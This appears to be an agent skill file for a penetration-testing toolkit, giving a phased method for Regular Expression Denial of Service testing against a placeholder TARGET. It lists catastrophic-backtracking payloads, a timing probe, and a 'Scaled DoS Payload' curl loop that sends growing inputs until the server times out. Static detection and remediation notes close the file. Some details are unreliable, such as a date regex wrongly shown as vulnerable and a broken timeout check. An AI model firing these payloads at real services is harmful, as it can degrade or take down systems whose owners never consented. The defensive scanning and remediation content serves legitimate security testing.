---
name: payload-redos
description: "ReDoS (Regular Expression Denial of Service) testing. Nested quantifier detection, catastrophic backtracking payloads, email/URL/date validation bypass, input length scaling attack. Triggers: 'redos', 'regex dos', 'regular expression denial of service', 'catastrophic backtracking', 'regex amplification', 'regex attack', 'regex complexity'."
---

# ReDoS — Regular Expression Denial of Service

Find vulnerable regex → craft catastrophic backtracking input → scale for DoS.

---

## Phase 1: Locate Regex Endpoints

```bash
TARGET="https://TARGET"

# Look for input validation that errors on bad format:
VALIDATION_ENDPOINTS=(
  "/register" "/signup" "/profile/update" "/contact"
  "/search" "/api/validate" "/api/check"
)

# Trigger validation error to confirm regex:
for endpoint in "${VALIDATION_ENDPOINTS[@]}"; do
  response=$(curl -s -X POST "$TARGET$endpoint" -d "email=invalid")
  echo "$response" | grep -iE "invalid|format|pattern|regex|validation" | head -2
done

# Source code patterns (if accessible):
# Find in JS/client-side:
curl -s "$TARGET/app.js" | grep -oE "/[^/]+[+*][^/]+/[gi]*"
curl -s "$TARGET/bundle.js" | grep -E "\.[a-z]+\(['\"].*[+*{].*['\"]" | head -20
```

---

## Phase 2: Payload List

```bash
# Common vulnerable regex patterns and their ReDoS inputs:

# Email validation with nested quantifiers:
# Pattern: ([a-zA-Z0-9._-]+)*@([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,}
# Payload:
AAAAAAAAAAAAAAAAAAAAAAAAAAA@

# URL validation alternation ambiguity:
# Pattern: (https?|ftp)://[^\s/]+
# Payload:
http:/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# Word repetition:
# Pattern: (\w+\s*)+$
# Payload:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

# Date validation:
# Pattern: \d{4}-\d{2}-\d{2}
# Payload:
1234-56-7a

# Nested quantifiers — most vulnerable:
# (a+)+ pattern → exponential backtracking
PAYLOAD_BASE="a"
for i in {1..10}; do
  PAYLOAD="${PAYLOAD_BASE}!"
  PAYLOAD_BASE="${PAYLOAD_BASE}a"
  echo "Length ${#PAYLOAD_BASE}: ${PAYLOAD_BASE}!"
done
```

---

## Phase 3: Time-Based Detection

```python
#!/usr/bin/env python3
import requests
import time

TARGET = "https://TARGET"
ENDPOINT = "/api/validate/email"

def test_redos(payload, repetitions=10):
    """Test if response time scales with input repetitions."""
    times = []
    for i in range(1, repetitions + 1):
        test_input = payload * i
        start = time.time()
        try:
            r = requests.post(TARGET + ENDPOINT,
                            data={"email": test_input},
                            timeout=30)
        except requests.Timeout:
            times.append(30.0)
            print(f"  reps={i}: TIMEOUT (30s) — ReDoS likely!")
            break
        elapsed = time.time() - start
        times.append(elapsed)
        print(f"  reps={i}, length={len(test_input)}: {elapsed:.3f}s")
    
    # Detect exponential growth:
    if len(times) > 3:
        if times[-1] > times[0] * 10:
            print("WARNING: Exponential time growth detected — ReDoS vulnerable!")
            return True
    return False

payloads = [
    "a" * 20 + "!",           # simple pattern
    "aaaa" * 5 + "@",         # email-like
    "a" * 10 + " " + "a" * 10 + "!",  # word repetition
]

for payload in payloads:
    print(f"Testing: {repr(payload[:30])}...")
    test_redos(payload, repetitions=8)
```

---

## Phase 4: Scaled DoS Payload

```bash
TARGET="https://TARGET/api/validate"
ENDPOINT="/email"

# Generate exponentially growing payload:
BASE="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
for mult in 1 2 4 8 16 32; do
  PAYLOAD="${BASE:0:$((mult * 10))}!"
  start_time=$(date +%s%N)
  
  response=$(timeout 30 curl -s -X POST "$TARGET$ENDPOINT" \
    -d "value=$PAYLOAD" -w "\n%{time_total}")
  
  end_time=$(date +%s%N)
  elapsed=$(echo "scale=3; ($end_time - $start_time) / 1000000000" | bc)
  
  echo "Length ${#PAYLOAD}: ${elapsed}s"
  [ "$elapsed" = "30." ] && echo "TIMEOUT at length ${#PAYLOAD}" && break
done
```

---

## Phase 5: Static Analysis (Source Code)

```python
# Detect vulnerable regex patterns in JS/Python source:
import re, sys

VULNERABLE_PATTERNS = [
    r'\([^)]+[+*]\)[+*]',        # (a+)+ style
    r'\([^)]+\)\{.*,\}\+',       # (a){n,}+ quantifier
    r'\([^)]+[+*]\)\{.*,\}',     # (a+){n,m}
    r'\(.*\|.*\)[+*]',           # (a|b)+ alternation
]

def check_file(filename):
    content = open(filename).read()
    # Find all regex literals:
    regex_literals = re.findall(r'/([^/]+)/[gimsuy]*', content)
    for pattern in regex_literals:
        for vuln in VULNERABLE_PATTERNS:
            if re.search(vuln, pattern):
                print(f"Potentially vulnerable regex: /{pattern}/")

if __name__ == "__main__":
    for f in sys.argv[1:]:
        check_file(f)
```

---

## Remediation Reference

```
1. Avoid nested quantifiers: (a+)+ → just a+
2. Avoid ambiguous alternation: (aa|a)+ with aaa... input
3. Enforce input length limits before regex evaluation
4. Use RE2 (linear time regex) or equivalent:
   - Python: google-re2 library
   - Node.js: re2 npm package
   - Go: regexp package (RE2 natively)
5. Set regex evaluation timeouts
```

---

## Output

Save to `.omop/engagement/vuln/redos/`:
- `timing-results.txt` — response time scaling evidence
- `poc-payload.txt` — payload causing longest response
- `vulnerable-endpoint.txt` — confirmed endpoint

## Next Phase

→ `pentest-report` for final report
